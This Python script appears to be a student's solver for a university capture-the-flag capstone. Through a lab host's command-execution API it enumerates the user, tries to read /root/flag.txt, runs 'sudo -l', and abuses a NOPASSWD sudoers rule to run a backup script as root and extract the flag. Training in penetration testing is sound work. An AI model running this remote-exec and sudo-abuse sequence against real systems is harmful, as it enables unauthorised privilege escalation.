#!/usr/bin/env python3
"""
================================================================================
CyberVault : Operation ShadowTrace - Stage 6 Capstone Solver & Verifier
Stage 6: System Security & Linux Privilege Escalation Capstone
Author: Member 3 - IT24103027 (Hettige D.R.B)
Target: CyberVault Capstone Staging Host (Local HTTP Port 5006 or Deployed Vercel URL)
Learning Outcome: LO3 - Develop exploitation code to facilitate penetration testing
================================================================================
"""

import sys
import os
import re
import requests

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')

def solve_stage6_api(api_url="http://localhost:5006"):
    api_url = api_url.rstrip("/")
    print("=" * 75)
    print(" [*] STAGE 6 CAPSTONE EXPLOITATION: Linux Privilege Escalation")
    print(f" [*] Author: IT24103027 (Hettige D.R.B)")
    print(f" [*] Target Interface: {api_url}")
    print("=" * 75)

    def run_cmd(command):
        try:
            resp = requests.post(f"{api_url}/api/exec", json={"command": command}, timeout=10)
            if resp.status_code == 200:
                return resp.json().get("output", "")
            else:
                return f"[-] HTTP Error: {resp.status_code}"
        except Exception as e:
            return f"[-] Error executing: {e}"

    # Phase 1: Identity & Environment Enumeration
    print("\n[+] Phase 1: Target Identity & System Enumeration...")
    whoami_out = run_cmd("whoami")
    id_out = run_cmd("id")
    uname_out = run_cmd("uname -a")
    print(f"    [-] Connected User: {whoami_out}")
    print(f"    [-] Identity Credentials: {id_out}")
    print(f"    [-] Kernel & System: {uname_out}")

    # Phase 2: Demonstrating Access Restriction (Negative Test)
    print("\n[+] Phase 2: Verifying Low-Privilege Restriction on Root Flag...")
    deny_test = run_cmd("cat /root/flag.txt")
    print(f"    [-] Attempting 'cat /root/flag.txt':")
    print(f"        {deny_test}")

    # Phase 3: Sudoers Configuration Audit (sudo -l)
    print("\n[+] Phase 3: Auditing Sudoers Configuration (sudo -l)...")
    sudo_l_out = run_cmd("sudo -l")
    print("    [-] sudo -l Output:")
    for line in sudo_l_out.splitlines():
        print(f"        {line}")

    # Phase 4: Misconfiguration Identification & Privilege Escalation
    print("\n[+] Phase 4: Exploiting Overly Broad Sudoers Rule...")
    if "NOPASSWD" in sudo_l_out and "/usr/local/bin/backup-vault.sh" in sudo_l_out:
        print("    [!] IDENTIFIED VULNERABLE DIRECTIVE:")
        print("        svc_backup ALL=(ALL) NOPASSWD: /usr/local/bin/backup-vault.sh")
        print("    [+] Executing binary with elevated root permissions via sudo...")
        
        priv_exec_out = run_cmd("sudo /usr/local/bin/backup-vault.sh")
        print("    [-] Privileged Execution Log:")
        for line in priv_exec_out.splitlines():
            print(f"        {line}")

        flag_match = re.search(r"CVT\{[a-zA-Z0-9_]+\}", priv_exec_out)
        if flag_match:
            capstone_flag = flag_match.group(0)
            print("\n    " + "=" * 50)
            print(f"    [OK] PRIVILEGE ESCALATION SUCCESSFUL!")
            print(f"    [OK] CAPSTONE ROOT FLAG: {capstone_flag}")
            print("    " + "=" * 50)
            print("    [+] Stage 6 Capstone Verified & Completed!")
            return True, capstone_flag
        else:
            print("    [!] Could not parse flag from output.")
            return False, None
    else:
        print("    [-] Vulnerable sudoers entry not found.")
        return False, None

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5006"
    success, flag = solve_stage6_api(target)
    sys.exit(0 if success else 1)
